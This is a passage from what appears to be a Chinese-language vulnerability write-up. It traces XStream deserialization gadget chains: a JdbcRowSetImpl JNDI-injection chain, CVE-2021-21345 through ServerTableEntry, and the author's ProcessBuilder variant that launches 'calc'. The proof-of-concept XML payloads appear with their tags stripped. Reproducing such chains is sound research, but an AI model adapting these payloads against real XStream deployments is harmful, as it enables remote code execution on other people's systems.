                                                com.sun.rowset.JdbcRowSetImpl
                                                        com.sun.rowset.JdbcRowSetImpl
                                                        getDatabaseMetaData
                                                        true
                                                        1
                                                        UTF-8
                                                1008
                                                true
                                                1000
                                                0
                                                2
                                                0
                                                0
                                                0
                                                true
                                                1004
                                                false
                                                rmi://127.0.0.1:1099/test
                                                    -1
                                                    -1
                                                    -1
                                                    -1
                                                    -1
                                                    -1
                                                    -1
                                                    -1
                                                    -1
                                                    -1
                                                    foo
            3
            javax.xml.ws.binding.attachments.inbound
            javax.xml.ws.binding.attachments.inbound
## 漏洞分析
这次的POC的写法就和最开始介绍的一样，实现了serializable接口，回去调用对应类重写的readObject方法
就直接跟进到PriorityQueue的readObject方法，在复现CC2的时候也是从这里进去的
前面就不跟了，直接看到下图调用compare方法这里
根据poc来看
size属性被置为2是之前CC链也提过很多次的了，这里的comparator属性是sun.awt.datatransfer.DataTransferer$IndexOrderComparator类，跟进看看
    public int compare(Object var1, Object var2) {
        return !this.order ? -compareIndices(this.indexMap, var1, var2, FALLBACK_INDEX) : compareIndices(this.indexMap, var1, var2, FALLBACK_INDEX);
    }
跟进compareaIndices方法，这里的indexMap属性被设置为了com.sun.xml.internal.ws.client.ResponseContext类
var0就是之前的indexMap，跟进到ResponseContext#get方法
根据poc的参数设置，最后可以来到com.sun.rowset.JdbcRowSetImpl
看看这一段的调用栈
com.sun.rowset.JdbcRowSetImpl这个类貌似在fastjson里面用到过
跟进connect
这里获取这个类的dataSource属性，然后进行一个lookup查询，只要控制了就可以造成一个jndi注入
# CVE-2021-21345远程代码执行漏洞
poc
          2
                          com.sun.corba.se.impl.activation.ServerTableEntry
                              com.sun.corba.se.impl.activation.ServerTableEntry
                              verify
                              true
                              1
                              UTF-8
                      calc
        3
        javax.xml.ws.binding.attachments.inbound
        javax.xml.ws.binding.attachments.inbound
其实还是反序列化，只是最后是通过com.sun.corba.se.impl.activation.ServerTableEntry类直接在本地执行恶意代码
主要还是Accessor#get方法的invoke
这里可以去调用任意类的方法
然后在ServerTableEntry#verify中直接调用了exec
然后控制activationCmd即可
其实既然可以这样去调用任意方法，那不是也可以去调用ProcessBuilder的start方法吗，我改了下poc发现居然可以
                2
                                                java.lang.ProcessBuilder
                                                        java.lang.ProcessBuilder
                                                        start
                                                        true
                                                        1
                                                        UTF-8
                                            calc
            3
            javax.xml.ws.binding.attachments.inbound
            javax.xml.ws.binding.attachments.inbound
# 写在最后
XStream组件的漏洞并没有复现完，但是大多数都是这个思路，通过标签转换可以获取到相应的java对象，并且可以对其中的参数进行控制，在实现serializable接口的类，还可以调用其中的readObject方法，达到一些命令执行的效果，可以是jndi，可以是直接命令执行，可以是加载恶意类
对于其他的一些洞也没有去进行相应的复现了，例如CVE-2021-29505
XStream远程代码执行漏洞复现，貌似是通过JRMP反序列化配合CC6达到RCE的效果
最后感谢各位师傅的文章，学到很多
参考链接